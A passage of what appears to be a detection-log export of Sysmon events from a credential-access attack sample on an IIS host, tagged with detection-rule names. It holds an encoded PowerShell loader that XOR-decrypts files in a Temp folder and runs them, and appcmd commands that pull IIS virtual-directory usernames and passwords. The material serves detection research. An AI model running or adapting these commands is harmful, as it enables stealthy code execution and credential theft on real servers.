sAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 1876
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6E-5CEB-0000-00106FA6FF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir /text:vdir.name'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:18.782
"
2019-05-27T01:29:18.893033+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5940,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 3304
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6E-5CEB-0000-00102FAAFF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""ERROR ( message:Configuration error "" /text:userName'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:18.852
"
2019-05-27T01:29:18.973148+00:00,Hacktool - EDR-Freeze Execution;Microsoft IIS Service Account Password Dumped;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5943,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 2276
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6E-5CEB-0000-0010EFADFF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""ERROR ( message:Configuration error "" /text:password'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:18.933
"
